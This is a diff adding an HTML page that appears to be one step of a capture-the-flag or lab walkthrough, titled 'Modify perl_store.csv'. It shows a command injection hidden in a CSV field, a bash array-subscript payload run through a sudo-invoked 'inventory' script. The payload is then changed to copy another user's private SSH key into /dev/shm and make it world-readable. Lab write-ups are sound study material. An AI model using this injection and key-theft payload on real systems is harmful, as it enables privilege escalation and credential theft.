@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>5.4 Modify "perl_store.csv"</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>5.4 Modify "perl_store.csv"</h1><br/><p></p><p>1. Edit “/home/ze_perlman/perl_store.csv” and add the following string at the end of line 2 (,x[$(id&gt;&amp;2)]).</p><p>    </p><p>  	<span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1062-1.png" alt="images/1062-1.png" /></p><p></p><p>2. Save the file.</p><p>   </p><p>3. Run the following commands.</p><p>    <div class="codebox"><pre>milou@perlman:~$ cd /home/ze_perlman/<br />milou@perlman:/home/ze_perlman$ sudo -u ze_perlman /bin/bash /home/ze_perlman/inventory<br /></pre></div> </p><p>  	<span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1062-2.png" alt="images/1062-2.png" /></p><p>    </p><p>    Realize that with the (,x[$(id&gt;&amp;2)]) is equivalent to echo id &gt;&amp;2.</p><p>    </p><p>4. Edit “/home/ze_perlman/perl_store.csv” again and change (,x[$(id&gt;&amp;2)]) to (,x[$(cp /home/ze_perlman/.ssh/id_rsa /dev/shm&gt;&amp;2 ; chmod 777 /dev/shm/id_rsa&gt;&amp;2)]).</p><p></p><p>    <img src="images/1062-3.png" alt="images/1062-3.png" /></p><p>    </p><p>5. Save the file.  </p><p>   </p><p>6. Check the output.</p><p>   <div class="codebox"><pre>milou@perlman:/home/ze_perlman$ sudo -u ze_perlman /bin/bash /home/ze_perlman/inventory</pre></div>  </p><p>  	<span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1062-4.png" alt="images/1062-4.png" /></p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
+</body>
+</html>
